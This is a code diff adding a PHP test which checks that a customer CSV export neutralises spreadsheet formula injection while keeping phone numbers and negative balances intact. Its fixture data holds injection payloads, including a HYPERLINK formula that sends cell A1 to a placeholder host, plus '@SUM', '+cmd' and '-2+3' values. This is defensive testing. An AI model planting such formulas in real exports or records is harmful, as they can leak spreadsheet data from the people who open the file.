@@ -125,6 +125,17 @@ it('exports the filtered customers of the current tenant as CSV', function (): v
     expect($due)->toContain('Rahim')->not->toContain('Karim');
 });
 
+it('neutralises spreadsheet formulas in the customer CSV but keeps numbers and phones', function (): void {
+    [$user, $tenant] = CustomerWorld::actor();
+    CustomerWorld::make($tenant, ['name' => '=HYPERLINK("http://x/?"&A1,"click")', 'shop_name' => '@SUM(A1)', 'area' => '+cmd', 'address_line' => '-2+3', 'phone' => '+8801711111111', 'balance' => Money::ofPaisa(-5000)]);
+
+    $csv = $this->actingAs($user)->get('/app/customers/export.csv')->streamedContent();
+    expect($csv)->toContain('"\'=HYPERLINK(""http://x/?""&A1,""click"")"')
+        ->toContain(",'@SUM(A1),+8801711111111,,,'+cmd,'-2+3,")
+        ->toContain(',-50.00,')
+        ->not->toContain(',=HYPERLINK');
+});
+
 it('keeps the export and the deep links behind their permissions', function (): void {
     [$keeper, $tenant] = CustomerWorld::actor(SystemRoles::STOCK_KEEPER);
     $customer = CustomerWorld::make($tenant, ['name' => 'Hidden']);
